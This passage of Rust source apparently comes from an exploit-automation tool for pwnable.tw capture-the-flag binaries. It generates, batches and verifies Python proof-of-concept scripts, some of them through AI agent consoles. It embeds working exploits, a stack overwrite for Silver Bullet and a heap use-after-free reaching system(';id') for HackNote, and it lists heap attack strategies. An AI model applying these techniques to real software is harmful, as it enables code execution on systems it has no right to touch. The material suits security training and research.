OFF_MALLOC_HOOK = {off_malloc_hook}
OFF_BIN_SH = {off_bin_sh}

def p32(x): return struct.pack("<I", x & 0xffffffff)
def p64(x): return struct.pack("<Q", x & 0xffffffffffffffff)

def argv():
    if RUNNER:
        if LOADER and os.path.exists(LOADER):
            libpath = LIBDIR or os.path.dirname(LOADER)
            bindir = os.path.dirname(os.path.abspath(BIN))
            if bindir and os.path.isdir(bindir):
                libpath = (libpath + ":" + bindir) if libpath else bindir
            return [RUNNER, LOADER, "--library-path", libpath, BIN]
        out = [RUNNER]
        if SYSROOT:
            out += ["-L", SYSROOT]
        out.append(BIN)
        return out
    return [BIN]

class Tube:
    def __init__(self):
        self.p = subprocess.Popen(argv(), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        self.buf = b""

    def read_until(self, needle, timeout=2.0):
        if isinstance(needle, str):
            needle = needle.encode()
        end = time.time() + timeout
        while needle not in self.buf and time.time() < end:
            ready, _, _ = select.select([self.p.stdout], [], [], max(0.0, min(0.05, end - time.time())))
            if not ready:
                continue
            b = self.p.stdout.read(1)
            if not b:
                break
            self.buf += b
        return self.buf

    def send(self, data):
        if isinstance(data, str):
            data = data.encode()
        self.p.stdin.write(data)
        self.p.stdin.flush()

    def line(self, data=b""):
        if isinstance(data, str):
            data = data.encode()
        self.send(data + b"\n")

    def choice(self, n, prompt=b"choice"):
        self.read_until(prompt)
        self.line(str(n).encode())

    def finish(self, timeout=5, max_output=20000):
        try:
            self.p.stdin.close()
        except Exception:
            pass
        out = b""
        end = time.time() + timeout
        while time.time() < end and len(self.buf) + len(out) < max_output:
            if self.p.poll() is not None:
                break
            ready, _, _ = select.select([self.p.stdout], [], [], max(0.0, min(0.05, end - time.time())))
            if not ready:
                continue
            chunk = os.read(self.p.stdout.fileno(), max(1, min(4096, max_output - len(self.buf) - len(out))))
            if not chunk:
                break
            out += chunk
        if self.p.poll() is None:
            self.p.kill()
            try:
                self.p.wait(timeout=1)
            except Exception:
                pass
        try:
            more = self.p.stdout.read(max(0, max_output - len(self.buf) - len(out))) or b""
        except Exception:
            more = b""
        data = self.buf + out + more
        try:
            sys.stdout.buffer.write(data[:max_output])
            if len(data) >= max_output:
                sys.stdout.write("\n[kaijulab] output truncated at %d bytes\n" % max_output)
            rc = self.p.returncode if self.p.returncode is not None else -1
            print("returncode=%d" % rc)
        except BrokenPipeError:
            pass
        return self.p.returncode if self.p.returncode is not None else -1

def main():
    t = Tube()
{chain_body}
    rc = t.finish()
    return 0 if rc == 42 else 1

if __name__ == "__main__":
    raise SystemExit(main())
"#,
        binary = binary.to_string_lossy(),
        primitive_note = primitive_note,
        sysroot_default = sysroot_default,
        qemu_default = qemu_default,
        loader_default = loader_default,
        libdir_default = libdir_default,
        width = width,
        offset = offset,
        base = base,
        heap = heap,
        off_system = sym_const("system"),
        off_exit = sym_const("exit"),
        off_free_hook = sym_const("__free_hook"),
        off_malloc_hook = sym_const("__malloc_hook"),
        off_bin_sh = sym_const("str_bin_sh"),
        chain_body = chain_body,
    ))
}

fn constraint_plan_json(
    binary: &Path,
    mode: &str,
    values: &[String],
    width: usize,
    prefix_words: usize,
    preserve: Option<&str>,
) -> Result<serde_json::Value> {
    let width = width.clamp(1, 8);
    let mask = if width >= 8 {
        u64::MAX
    } else {
        (1u64 << (width * 8)) - 1
    };
    let mut parsed = Vec::new();
    for value in values {
        parsed.push(parse_hex_u64(value)? & mask);
    }
    let preserve_value = preserve.map(parse_hex_u64).transpose()?.map(|v| v & mask);
    let mode_norm = mode.to_ascii_lowercase().replace('_', "-");
    let mut planned = parsed.clone();
    let mut warnings = Vec::new();
    match mode_norm.as_str() {
        "sorted-ascending" => {
            planned.sort_unstable();
            if planned != parsed {
                warnings.push("input values were not ascending; sorted plan changes write order, which is only valid when the program sorts before the overwrite".to_string());
            }
        }
        "sorted-descending" => {
            planned.sort_unstable_by(|a, b| b.cmp(a));
            if planned != parsed {
                warnings.push("input values were not descending; sorted plan changes write order, which is only valid when the program sorts before the overwrite".to_string());
            }
        }
        "avoid-null" => {
            for value in &planned {
                if (0..width).any(|i| ((value >> (i * 8)) & 0xff) == 0) {
                    warnings.push(format!("0x{value:x} contains a NUL byte; use split writes or a different target/gadget"));
                }
            }
        }
        "preserve-canary" => {
            if preserve_value.is_none() {
                warnings
                    .push("--preserve is required to model canary-preserving writes".to_string());
            }
        }
        other => anyhow::bail!("unknown --mode '{other}'"),
    }
    let mut final_words = vec![0u64; prefix_words];
    if let Some(value) = preserve_value {
        final_words.push(value);
    }
    final_words.extend(planned.iter().copied());
    Ok(serde_json::json!({
        "kind": "constraint_plan",
        "binary": binary,
        "mode": mode_norm,
        "width": width,
        "input_values": parsed.iter().map(|v| format!("0x{v:x}")).collect::<Vec<_>>(),
        "planned_values": planned.iter().map(|v| format!("0x{v:x}")).collect::<Vec<_>>(),
        "final_words": final_words.iter().map(|v| format!("0x{v:x}")).collect::<Vec<_>>(),
        "decimal_lines": final_words.iter().map(|v| v.to_string()).collect::<Vec<_>>(),
        "warnings": warnings,
        "next_action": "Use decimal_lines for numeric menu inputs only after confirming the program writes/sorts exactly these word-sized values."
    }))
}

async fn exploit_batch_loop_json(
    client: &reqwest::Client,
    base_url: &str,
    token: Option<&str>,
    agent: &str,
    files_spec: Option<&str>,
    output_dir: &Path,
    attempts: u32,
    sysroot: Option<&Path>,
    timeout_secs: u64,
    idle_timeout_secs: u64,
) -> Result<serde_json::Value> {
    std::fs::create_dir_all(output_dir)
        .with_context(|| format!("create {}", output_dir.display()))?;
    let files = if let Some(spec) = files_spec {
        batch_files_from_spec(spec)?
    } else {
        default_pwnabletw_batch_files()
    };
    let mut results = Vec::new();
    for file in files {
        if !file.exists() {
            results.push(serde_json::json!({
                "file": file,
                "status": "missing",
            }));
            continue;
        }
        let path = resolve_api_binary_path(client, base_url, token, Some(file.clone())).await?;
        let stem = path
            .file_name()
            .and_then(|v| v.to_str())
            .unwrap_or("poc")
            .replace('/', "_");
        let output = output_dir.join(format!("kaijulab-{stem}-poc.py"));
        let context = build_exploit_context(&path, 8)?;
        let effective_sysroot = effective_sysroot(
            sysroot,
            context.get("arch").and_then(|v| v.as_str()),
            context
                .pointer("/runtime/interpreter")
                .and_then(|v| v.as_str()),
        );
        let prompt = exploit_batch_exec_prompt(
            &path,
            &output,
            attempts,
            effective_sysroot.as_deref(),
            &context,
        )?;
        let prompt_path = output.with_extension("prompt.md");
        std::fs::write(&prompt_path, &prompt)
            .with_context(|| format!("write {}", prompt_path.display()))?;
        let started = Instant::now();
        let agent_response = serde_json::json!({
            "prompt": prompt_path,
            "mode": agent,
        });
        let status = if matches!(agent, "prompt-pack" | "offline" | "none") {
            "prompt_written"
        } else if matches!(agent, "claude-exec" | "claude-p") {
            results.push(serde_json::json!({
                "file": path,
                "output": output,
                "prompt": prompt_path,
                "status": "unsupported_agent",
                "error": "claude -p is intentionally not used inside KaijuLab; use agent=prompt-pack or the interactive claude Agent Console",
                "duration_ms": started.elapsed().as_millis(),
            }));
            continue;
        } else {
            open_api_workspace(client, base_url, token, &path).await?;
            reset_agent_console(client, base_url, token, agent).await;
            match run_agent_console(
                base_url,
                token,
                agent,
                Some(prompt),
                true,
                Some(idle_timeout_secs),
                Some(timeout_secs),
                800,
                true,
                120,
                32,
            )
            .await
            {
                Ok(()) => "completed",
                Err(e) => {
                    results.push(serde_json::json!({
                        "file": path,
                        "output": output,
                        "status": "agent_error",
                        "error": e.to_string(),
                        "duration_ms": started.elapsed().as_millis(),
                    }));
                    continue;
                }
            }
        };
        let verify = if output.exists() {
            Some(verify_exploit_script(
                &output,
                &path,
                30,
                None,
                Some(42),
                None,
                effective_sysroot.as_deref(),
                &[],
            )?)
        } else {
            None
        };
        results.push(serde_json::json!({
            "file": path,
            "output": output,
            "prompt": prompt_path,
            "status": status,
            "duration_ms": started.elapsed().as_millis(),
            "agent_response": agent_response,
            "verify": verify,
        }));
    }
    Ok(serde_json::json!({
        "kind": "exploit_batch_loop",
        "agent": agent,
        "output_dir": output_dir,
        "targets": results,
        "next_action": "For any target with verify.success != true, run poc-repair on its output and rerun a single exploit-loop attempt with the repair diagnosis."
    }))
}

fn auto_pwn_json(
    files_spec: Option<&str>,
    output_dir: &Path,
    sysroot: Option<&Path>,
    timeout_secs: u64,
    no_verify: bool,
) -> Result<serde_json::Value> {
    std::fs::create_dir_all(output_dir)
        .with_context(|| format!("create {}", output_dir.display()))?;
    let files = if let Some(spec) = files_spec {
        batch_files_from_spec(spec)?
    } else {
        default_pwnabletw_batch_files()
    };
    let mut targets = Vec::new();
    for file in files {
        if !file.exists() {
            targets.push(serde_json::json!({
                "file": file,
                "status": "missing",
            }));
            continue;
        }
        let path = file.canonicalize().unwrap_or(file);
        let data = std::fs::read(&path).unwrap_or_default();
        let arch = binary_arch_from_data(&data);
        let interpreter = binary_interpreter_from_data(&data);
        let effective_sysroot = auto_pwn_effective_sysroot(
            &path,
            &data,
            sysroot,
            arch.as_deref(),
            interpreter.as_deref(),
        );
        let stem = path
            .file_name()
            .and_then(|v| v.to_str())
            .unwrap_or("target")
            .replace('/', "_");
        let output = output_dir.join(format!("kaijulab-{stem}-autopwn.py"));
        let started = Instant::now();
        let candidate = auto_pwn_candidate(&path, &data, effective_sysroot.as_deref())?;
        let mut status = "candidate_written";
        if let Some(script) = candidate.get("script").and_then(|v| v.as_str()) {
            std::fs::write(&output, script)
                .with_context(|| format!("write {}", output.display()))?;
        } else {
            status = "no_candidate";
        }
        let expect_output = candidate.get("expect_output").and_then(|v| v.as_str());
        let expect_target_exit = if expect_output.is_some() {
            None
        } else {
            Some(42)
        };
        let verify = if status == "candidate_written" && !no_verify {
            Some(verify_exploit_script(
                &output,
                &path,
                timeout_secs,
                None,
                expect_target_exit,
                expect_output,
                effective_sysroot.as_deref(),
                &[],
            )?)
        } else {
            None
        };
        let solved = verify
            .as_ref()
            .and_then(|v| v.get("success"))
            .and_then(|v| v.as_bool())
            .unwrap_or(false);
        targets.push(serde_json::json!({
            "file": path,
            "arch": arch,
            "sysroot": effective_sysroot.as_deref(),
            "output": output,
            "status": if solved { "solved" } else { status },
            "family": candidate.get("family"),
            "confidence": candidate.get("confidence"),
            "runtime_notes": candidate.get("runtime_notes"),
            "success_predicate": if let Some(output) = expect_output {
                serde_json::json!({"expect_output": output})
            } else {
                serde_json::json!({"expect_target_exit": 42})
            },
            "notes": candidate.get("notes"),
            "root_causes_if_failed": auto_pwn_root_causes(&candidate, verify.as_ref()),
            "verify": verify,
            "duration_ms": started.elapsed().as_millis(),
        }));
    }
    Ok(serde_json::json!({
        "kind": "auto_pwn",
        "output_dir": output_dir,
        "no_llm": true,
        "claude_p_used": false,
        "targets": targets,
        "next_action": "Targets with status=solved have verified PoCs. For the rest, use their root_causes_if_failed as the next implementation backlog instead of retrying prompt mode."
    }))
}

fn auto_pwn_candidate(
    binary: &Path,
    data: &[u8],
    sysroot: Option<&Path>,
) -> Result<serde_json::Value> {
    let text = String::from_utf8_lossy(data);
    let lower = text.to_ascii_lowercase();
    let sysroot_s = sysroot
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_default();
    let runtime_notes = auto_pwn_runtime_notes(binary, &lower, sysroot);
    if lower.contains("silver bullet") && lower.contains("werewolf") {
        return Ok(serde_json::json!({
            "family": "i386 stack/control-data overwrite to imported exit",
            "confidence": "high",
            "notes": [
                "Signature requires Silver Bullet menu strings and no libc leak.",
                "Payload uses integer-overflow power accumulation to overwrite the saved return path and calls exit@plt(42)."
            ],
            "runtime_notes": runtime_notes,
            "script": silver_bullet_exit42_script(binary, &sysroot_s),
        }));
    }
    if lower.contains("hacknote") && lower.contains("add note") && lower.contains("delete note") {
        return Ok(serde_json::json!({
            "family": "heap UAF function-pointer/content-pointer overlap",
            "confidence": "medium",
            "notes": [
                "Signature requires add/delete/print note lifecycle strings.",
                "Candidate derives libc offsets from the actual qemu sysroot libc before finalizing.",
                "Predicate is deterministic command output because this UAF naturally reaches system(command)."
            ],
            "runtime_notes": runtime_notes,
            "expect_output": "uid=",
            "script": hacknote_uaf_script(binary, &sysroot_s),
        }));
    }
    let scaffold =
        if lower.contains("malloc") || lower.contains("free") || lower.contains("realloc") {
            poc_template_script(binary, &sysroot_s, "heap lifecycle exploit scaffold")
        } else if lower.contains("sort") || lower.contains("number") {
            poc_template_script(binary, &sysroot_s, "constrained numeric write scaffold")
        } else if lower.contains("file") || lower.contains("filename") {
            poc_template_script(binary, &sysroot_s, "file-structure/leak exploit scaffold")
        } else {
            poc_template_script(binary, &sysroot_s, "generic exploit scaffold")
        };
    Ok(serde_json::json!({
        "family": "scaffold",
        "confidence": "low",
        "notes": [
            "No verified offline finalizer matched this target's structural signature.",
            "Generated script is intentionally a non-success scaffold; it should not print SCRIPT_READY."
        ],
        "runtime_notes": runtime_notes,
        "script": scaffold,
    }))
}

fn auto_pwn_effective_sysroot(
    _binary: &Path,
    data: &[u8],
    explicit: Option<&Path>,
    arch: Option<&str>,
    interpreter: Option<&str>,
) -> Option<PathBuf> {
    if let Some(path) = explicit {
        return Some(path.to_path_buf());
    }
    let lower = String::from_utf8_lossy(data).to_ascii_lowercase();
    if arch == Some("i386")
        && (lower.contains("dubblesort")
            || lower.contains("what your name")
            || lower.contains("seethefile")
            || lower.contains("apple store"))
    {
        let legacy = PathBuf::from("/tmp/i386sysroot/root");
        if legacy.join("lib/i386-linux-gnu/ld-2.23.so").exists()
            || legacy.join("lib/ld-linux.so.2").exists()
            || legacy.join("usr/lib/i386-linux-gnu/ld-linux.so.2").exists()
        {
            return Some(legacy);
        }
    }
    effective_sysroot(None, arch, interpreter).map(|p| p.into_owned())
}

fn auto_pwn_runtime_notes(binary: &Path, lower_text: &str, sysroot: Option<&Path>) -> Vec<String> {
    let mut notes = Vec::new();
    let sysroot_s = sysroot
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_default();
    for obj in adjacent_shared_objects(binary) {
        let name = obj
            .get("path")
            .and_then(|v| v.as_str())
            .and_then(|p| Path::new(p).file_name())
            .and_then(|v| v.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();
        if !name.contains("libc") {
            continue;
        }
        let version = obj
            .get("glibc_version")
            .and_then(|v| v.as_str())
            .unwrap_or("unknown");
        let loaders = obj
            .get("matching_loaders")
            .and_then(|v| v.as_array())
            .map(|v| v.len())
            .unwrap_or(0);
        if loaders == 0 {
            notes.push(format!(
                "bundled libc {name} found (glibc {version}), but no matching ld-{version}.so loader was found on disk"
            ));
        } else {
            notes.push(format!(
                "bundled libc {name} found (glibc {version}) with {loaders} matching loader candidate(s)"
            ));
        }
    }
    if (lower_text.contains("tcache")
        || lower_text.contains("realloc")
        || lower_text.contains("malloc"))
        && sysroot_s.contains("/opt/sysroots")
        && !adjacent_shared_objects(binary).is_empty()
    {
        notes.push("selected sysroot may be newer than the bundled challenge libc; old tcache/realloc primitives can require a matching old dynamic loader, not only LD_PRELOAD".to_string());
    }
    if lower_text.contains("dubblesort") || lower_text.contains("what your name") {
        notes.push("sorted ret2libc finalizer depends on libc addresses sorting above the stack canary; modern qemu/sysroot mappings can invalidate the classic layout".to_string());
    }
    if lower_text.contains("seethefile") {
        notes.push("FILE/vtable finalizer depends on glibc FILE layout; use a matching i386 glibc/loader before trusting fake FILE offsets".to_string());
    }
    if lower_text.contains("apple store") {
        notes.push("unlink/stack finalizer depends on stable i386 libc environ and stack layout; use matching glibc/loader for the classic primitive".to_string());
    }
    notes
}

fn auto_pwn_root_causes(
    candidate: &serde_json::Value,
    verify: Option<&serde_json::Value>,
) -> serde_json::Value {
    if verify
        .and_then(|v| v.get("success"))
        .and_then(|v| v.as_bool())
        .unwrap_or(false)
    {
        return serde_json::json!([]);
    }
    let mut causes = Vec::new();
    if candidate
        .get("confidence")
        .and_then(|v| v.as_str())
        .unwrap_or("")
        == "low"
    {
        causes.push("no verified reusable finalizer for this structural family yet");
    }
    if let Some(notes) = candidate.get("runtime_notes").and_then(|v| v.as_array()) {
        for note in notes.iter().filter_map(|v| v.as_str()) {
            if note.contains("matching old dynamic loader")
                || note.contains("matching i386 glibc")
                || note.contains("modern qemu/sysroot")
                || note.contains("no matching ld-")
            {
                causes.push(note);
            }
        }
    }
    if let Some(verify) = verify {
        let combined = format!(
            "{}{}",
            verify.get("stdout").and_then(|v| v.as_str()).unwrap_or(""),
            verify.get("stderr").and_then(|v| v.as_str()).unwrap_or("")
        )
        .to_ascii_lowercase();
        if combined.contains("no leak") || combined.contains("returncode=99") {
            causes.push("leak stage did not expose a usable libc/heap/stack pointer");
        }
        if combined.contains("segmentation fault") || combined.contains("returncode=-11") {
            causes.push("control-transfer target or computed runtime address is wrong");
        }
        if combined.contains("not found") && combined.contains("sh:") {
            causes.push("system() command string is malformed or truncated");
        }
        if verify
            .get("timed_out")
            .and_then(|v| v.as_bool())
            .unwrap_or(false)
        {
            causes.push("candidate left the target in an interactive loop");
        }
    }
    causes.sort_unstable();
    causes.dedup();
    serde_json::json!(causes)
}

fn py_string(s: &str) -> String {
    format!("{s:?}")
}

fn silver_bullet_exit42_script(binary: &Path, sysroot: &str) -> String {
    let bin = py_string(&binary.to_string_lossy());
    let sysroot = py_string(sysroot);
    format!(
        r#"#!/usr/bin/env python3
import os, select, struct, subprocess, sys, time
BIN = os.environ.get("KAIJU_BINARY") or os.environ.get("KAIJULAB_BINARY") or {bin}
SYSROOT = os.environ.get("KAIJU_SYSROOT") or os.environ.get("KAIJULAB_SYSROOT") or {sysroot}
RUNNER = os.environ.get("QEMU_I386") or "/usr/bin/qemu-i386-static"
def p32(x): return struct.pack("<I", x & 0xffffffff)
def rx(p, marker, timeout=2.0):
    buf = b""; end = time.time() + timeout
    while time.time() < end:
        r,_,_ = select.select([p.stdout], [], [], 0.05)
        if r:
            c = os.read(p.stdout.fileno(), 4096)
            if not c: break
            buf += c
            if marker in buf: return buf
    return buf
def sl(p, s):
    if isinstance(s, str): s = s.encode()
    p.stdin.write(s + b"\n"); p.stdin.flush()
def create(p, data):
    rx(p, b"choice"); sl(p, "1"); rx(p, b"bullet :"); sl(p, data)
def power(p, data):
    rx(p, b"choice"); sl(p, "2"); rx(p, b"bullet :"); sl(p, data)
def beat(p):
    rx(p, b"choice"); sl(p, "3")
def main():
    argv = [RUNNER, "-L", SYSROOT, BIN] if SYSROOT else [RUNNER, BIN]
    p = subprocess.Popen(argv, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    try:
        create(p, b"A" * 47)
        power(p, b"B")
        power(p, b"\xff" * 7 + p32(0x80484b8) + p32(0x41414141) + p32(42))
        beat(p)
        try: out, err = p.communicate(timeout=4)
        except subprocess.TimeoutExpired:
            p.kill(); out, err = p.communicate()
        sys.stdout.buffer.write(out[-512:]); sys.stderr.buffer.write(err[-512:])
        print("returncode=%s" % p.returncode)
        return 0 if p.returncode == 42 else 1
    finally:
        try: p.kill()
        except Exception: pass
if __name__ == "__main__":
    raise SystemExit(main())
"#
    )
}

fn hacknote_uaf_script(binary: &Path, sysroot: &str) -> String {
    let bin = py_string(&binary.to_string_lossy());
    let sysroot = py_string(sysroot);
    format!(
        r#"#!/usr/bin/env python3
import os, re, select, struct, subprocess, sys, time
BIN = os.environ.get("KAIJU_BINARY") or os.environ.get("KAIJULAB_BINARY") or {bin}
SYSROOT = os.environ.get("KAIJU_SYSROOT") or os.environ.get("KAIJULAB_SYSROOT") or {sysroot}
RUNNER = os.environ.get("QEMU_I386") or "/usr/bin/qemu-i386-static"
def p32(x): return struct.pack("<I", x & 0xffffffff)
def u32(b): return struct.unpack("<I", b[:4].ljust(4, b"\x00"))[0]
def rx(p, marker, timeout=2.0):
    buf = b""; end = time.time() + timeout
    while time.time() < end:
        r,_,_ = select.select([p.stdout], [], [], 0.05)
        if r:
            c = os.read(p.stdout.fileno(), 4096)
            if not c: break
            buf += c
            if marker in buf: return buf
    return buf
def sl(p, s):
    if isinstance(s, str): s = s.encode()
    p.stdin.write(s + b"\n"); p.stdin.flush()
def add(p, size, data):
    rx(p, b"choice"); sl(p, "1"); rx(p, b"size"); sl(p, str(size)); rx(p, b"Content"); sl(p, data)
def delete(p, idx):
    rx(p, b"choice"); sl(p, "2"); rx(p, b"Index"); sl(p, str(idx))
def show(p, idx):
    rx(p, b"choice"); sl(p, "3"); rx(p, b"Index"); sl(p, str(idx)); return rx(p, b"choice", 1.0)
def libc_offsets():
    libc = os.path.join(SYSROOT, "usr/lib/i386-linux-gnu/libc.so.6")
    out = subprocess.check_output(["readelf", "-s", libc], stderr=subprocess.DEVNULL, timeout=4).decode("latin1", "ignore")
    vals = {{}}
    for line in out.splitlines():
        cols = line.split()
        if len(cols) >= 8 and cols[1].isalnum():
            name = cols[-1].split("@@", 1)[0]
            if name in ("puts", "system"):
                vals[name] = int(cols[1], 16)
    return vals["puts"], vals["system"]
def main():
    puts_off, system_off = libc_offsets()
    p = subprocess.Popen([RUNNER, "-L", SYSROOT, BIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    try:
        add(p, 32, b"A" * 8); add(p, 32, b"B" * 8); delete(p, 0); delete(p, 1)
        add(p, 8, p32(0x804862b) + p32(0x804a024))
        out = show(p, 0)
        leak = None
        for i in range(max(0, len(out) - 3)):
            v = u32(out[i:i+4])
            if 0x30000000 <= v <= 0xf8000000:
                leak = v; break
        if leak is None:
            sys.stdout.buffer.write(out[-512:]); print("returncode=99 (no libc leak)"); return 1
        system = leak - puts_off + system_off
        delete(p, 2)
        add(p, 8, p32(system) + b";id")
        show(p, 0)
        try: out, err = p.communicate(timeout=1)
        except subprocess.TimeoutExpired:
            p.kill(); out, err = p.communicate()
        sys.stdout.buffer.write(out[-512:]); sys.stderr.buffer.write(err[-512:])
        print("returncode=%s" % p.returncode)
        return 0 if p.returncode == 42 else 1
    finally:
        try: p.kill()
        except Exception: pass
if __name__ == "__main__":
    raise SystemExit(main())
"#
    )
}

fn poc_template_script(binary: &Path, sysroot: &str, family: &str) -> String {
    let bin = py_string(&binary.to_string_lossy());
    let sysroot = py_string(sysroot);
    let family = py_string(family);
    format!(
        r#"#!/usr/bin/env python3
import os, subprocess, sys
BIN = os.environ.get("KAIJU_BINARY") or os.environ.get("KAIJULAB_BINARY") or {bin}
SYSROOT = os.environ.get("KAIJU_SYSROOT") or os.environ.get("KAIJULAB_SYSROOT") or {sysroot}
FAMILY = {family}
print("AUTO_PWN_SCAFFOLD=%s" % FAMILY)
print("returncode=99 (no verified offline finalizer matched this target)")
raise SystemExit(1)
"#
    )
}

fn batch_files_from_spec(spec: &str) -> Result<Vec<PathBuf>> {
    let value = read_json_or_inline(spec)?;
    let values = value
        .get("files")
        .and_then(|v| v.as_array())
        .or_else(|| value.as_array())
        .ok_or_else(|| anyhow::anyhow!("--files must be a JSON array or object with files[]"))?;
    Ok(values
        .iter()
        .filter_map(|v| v.as_str())
        .map(PathBuf::from)
        .collect())
}

fn default_pwnabletw_batch_files() -> Vec<PathBuf> {
    [
        "samples/PwnableTW/tcache-tear/tcache_tear",
        "samples/PwnableTW/silver-bullet/silver_bullet",
        "samples/PwnableTW/realloc/re-alloc",
        "samples/PwnableTW/seethefile/seethefile",
        "samples/PwnableTW/dubblesort/dubblesort",
        "samples/PwnableTW/hacknote/hacknote",
        "samples/PwnableTW/applestore/applestore",
    ]
    .iter()
    .map(PathBuf::from)
    .filter(|p| p.exists())
    .collect()
}

fn select_libc_path(binary: &Path, explicit: Option<&Path>) -> Result<PathBuf> {
    if let Some(path) = explicit {
        return Ok(path.to_path_buf());
    }
    for obj in adjacent_shared_objects(binary) {
        let Some(path) = obj.get("path").and_then(|v| v.as_str()) else {
            continue;
        };
        let name = Path::new(path)
            .file_name()
            .and_then(|v| v.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();
        if name.contains("libc") {
            return Ok(PathBuf::from(path));
        }
    }
    anyhow::bail!(
        "no adjacent libc-like shared object found near {}; pass --libc",
        binary.display()
    )
}

fn symbol_offset_from_map(
    map: &serde_json::Map<String, serde_json::Value>,
    name: &str,
) -> Option<u64> {
    map.get(name)
        .and_then(|v| v.as_str())
        .and_then(|s| parse_hex_u64(s).ok())
}

fn parse_hex_u64(text: &str) -> Result<u64> {
    let trimmed = text.trim();
    if let Some(hex) = trimmed
        .strip_prefix("0x")
        .or_else(|| trimmed.strip_prefix("0X"))
    {
        return u64::from_str_radix(hex, 16).map_err(Into::into);
    }
    if trimmed.chars().any(|c| matches!(c, 'a'..='f' | 'A'..='F')) {
        u64::from_str_radix(trimmed, 16).map_err(Into::into)
    } else {
        trimmed.parse::<u64>().map_err(Into::into)
    }
}

fn json_u64(value: &serde_json::Value) -> Option<u64> {
    value
        .as_u64()
        .or_else(|| value.as_str().and_then(|s| parse_hex_u64(s).ok()))
}

fn heap_probe_plan_json(binary: &Path) -> Result<serde_json::Value> {
    let facts = binary_facts_json(binary, 30)?;
    Ok(serde_json::json!({
        "kind": "heap_probe_plan",
        "binary": binary,
        "strategy_families": facts.get("ranked_exploit_families"),
        "generic_probes": [
            {
                "name": "menu transcript map",
                "goal": "Build one exploit-interact JSON transcript for each menu action and record prompts/state changes.",
                "actions_template": [{"send_choice": 1}, {"expect": "choice"}],
                "success_signal": "Each action has bounded stdout and returns to a known prompt or exits predictably."
            },
            {
                "name": "uaf function-pointer reuse",
                "goal": "Allocate two same-sized objects, free one, reallocate with pointer-sized controlled bytes, then trigger stale show/call path.",
                "primitive_signal": "Triggered path dereferences bytes from replacement allocation; debug-probe shows pc/eip/rip near controlled value or target exits via chosen PLT."
            },
            {
                "name": "double-free/tcache-fastbin duplicate",
                "goal": "Free A/B/A or equivalent size-class sequence, then allocate controlled chunks until the same address is returned twice.",
                "primitive_signal": "Two logical objects alias the same chunk; editing one changes the other or verifier observes controlled write target."
            },
            {
                "name": "chunk overlap",
                "goal": "Use off-by-one/size overwrite/realloc behavior to make two live objects overlap.",
                "primitive_signal": "runtime transcript proves object B contents change after editing object A without using B's edit path."
            },
            {
                "name": "unsorted-bin/libc leak",
                "goal": "Free a large chunk, print or copy freed metadata, parse arena pointer, then compute libc base from adjacent libc offsets.",
                "primitive_signal": "Leak pointer falls in libc mapping or matches bundled libc offset arithmetic."
            },
            {
                "name": "arbitrary write finalization",
                "goal": "After proving write primitive, target GOT/hook/vtable/function pointer only if protections and call path support it.",
                "primitive_signal": "exploit-verify sees returncode=42 or expected command marker."
            }
        ],
        "recommended_order": [
            "binary-facts",
            "exploit-scaffold --output /tmp/poc.py",
            "exploit-drive with recv_until/sendline_after synchronized transcripts",
            "leak-probe for repeated maps/pointer harvesting",
            "debug-probe only after a concrete primitive signal",
            "exploit-verify after each candidate edit"
        ],
    }))
}

fn read_limited<R: Read>(reader: R, max: u64) -> Vec<u8> {
    let mut out = Vec::new();
    let _ = reader.take(max).read_to_end(&mut out);
    out
}

fn runtime_run_json(
    binary: &Path,
    args: &[String],
    envs: &[String],
    stdin_spec: Option<&str>,
    cwd: Option<&Path>,
    runner: Option<&str>,
    sysroot: Option<&Path>,
    timeout_secs: u64,
) -> Result<serde_json::Value> {
    let data = std::fs::read(binary).with_context(|| format!("read {}", binary.display()))?;
    let context = build_exploit_context(binary, 8)?;
    let stdin_bytes = read_input_spec(stdin_spec)?;
    let mut cmdline = Vec::new();

    let arch = binary_arch_from_data(&data);
    let interpreter = binary_interpreter_from_data(&data);
    let effective_sysroot = effective_sysroot(sysroot, arch.as_deref(), interpreter.as_deref());
    let effective_runner = runner
        .map(|r| r.to_string())
        .or_else(|| default_runner_for_arch(arch.as_deref()));

    if let Some(runner) = &effective_runner {
        cmdline.push(runner.to_string());
        if let Some(sysroot) = effective_sysroot.as_deref() {
            cmdline.push("-L".to_string());
            cmdline.push(sysroot.to_string_lossy().into_owned());
        }
        cmdline.push(binary.to_string_lossy().into_owned());
    } else {
        cmdline.push(binary.to_string_lossy().into_owned());
    }
    cmdline.extend(args.iter().cloned());

    let mut cmd = Command::new(&cmdline[0]);
    cmd.args(&cmdline[1..])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    if let Some(cwd) = cwd {
        cmd.current_dir(cwd);
    }
    for env in envs {
        let Some((key, value)) = env.split_once('=') else {
            anyhow::bail!("invalid --env '{}'; expected KEY=VALUE", env);
        };
        cmd.env(key, value);
    }
    if stdin_bytes.is_some() {
        cmd.stdin(Stdio::piped());
    } else {
        cmd.stdin(Stdio::null());
    }
    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        cmd.process_group(0);
    }

    let output = run_captured(cmd, stdin_bytes.as_deref(), timeout_secs, 512 * 1024)?;
    Ok(serde_json::json!({
        "kind": "runtime_run",
        "binary": binary,
        "cmd": cmdline,
        "runner_selected": effective_runner,
        "sysroot_selected": effective_sysroot.as_deref(),
        "cwd": cwd,
        "timeout_secs": timeout_secs.clamp(1, 300),
        "elf_runtime": runtime_candidates(binary, &data),
        "context_summary": {
            "format": context.get("format"),
            "arch": context.get("arch"),
            "protections": context.get("protections"),
            "runtime_notes": context.pointer("/runtime/notes"),
        },
        "result": output,
        "next_action": runtime_next_action(&output),
    }))
}

fn debug_probe_json(
    binary: &Path,
    args: &[String],
    stdin_spec: Option<&str>,
    sysroot: Option<&Path>,
    breakpoints: &[String],
    continue_after_break: bool,
    timeout_secs: u64,
) -> Result<serde_json::Value> {
    let data = std::fs::read(binary).with_context(|| format!("read {}", binary.display()))?;
    let arch = binary_arch_from_data(&data);
    let interpreter = binary_interpreter_from_data(&data);
    let effective_sysroot = effective_sysroot(sysroot, arch.as_deref(), interpreter.as_deref());
    if arch.as_deref().is_some_and(|a| a != host_arch_label()) {
        return debug_probe_remote_json(
            binary,
